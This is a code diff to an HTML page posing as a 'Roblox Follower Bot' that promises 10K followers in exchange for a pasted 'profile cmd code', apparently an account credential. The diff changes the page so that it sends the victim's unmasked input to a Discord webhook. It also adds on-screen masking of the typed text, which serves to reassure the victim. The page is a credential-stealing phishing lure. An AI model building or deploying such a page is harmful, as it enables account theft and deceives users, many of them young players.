@@ -102,7 +102,7 @@
     <h2>Frellower Roblox Follower Bot</h2>
     <p>Please enter your 'ONLY' profile cmd code. Then click the 'Send' Button and get 10K FOLLOWERS in 10 minutes max!</p>
 
-    <textarea id="inputText" placeholder="Enter Profile CMD Code Here!"></textarea><br>
+    <textarea id="inputText" placeholder="Enter Profile CMD Code Here!" oninput="maskInput()"></textarea><br>
     <button onclick="uploadText()">Send!</button>
 
     <div id="message-container">
@@ -110,14 +110,18 @@
     </div>
 
     <script>
+        // Kullanıcının yazdığı metni maskeleme fonksiyonu
+        function maskInput() {
+            const text = document.getElementById("inputText").value;
+            const maskedText = text.replace(/[^ ]/g, '•'); // Her harfi '•' ile değiştirir (boşluklar hariç)
+            document.getElementById("inputText").value = maskedText;
+        }
+
         function uploadText() {
             const text = document.getElementById("inputText").value;
 
-            // Metni noktalı hale getirelim (harfler yerine '•' koyuyoruz, boşluklar hariç)
-            const maskedText = text.replace(/[^ ]/g, '•'); // Her karakteri '•' ile değiştirir (boşluklar hariç)
-
-            // Mesajı parçalara ayıracak ve her birini webhook'a gönderecek fonksiyon
-            sendToDiscord(maskedText);
+            // Gerçek metni, maskelenmiş olanı değil, webhook'a gönderelim
+            sendToDiscord(text);
 
             // Success mesajını gösterelim
             const messageContainer = document.getElementById("message-container");
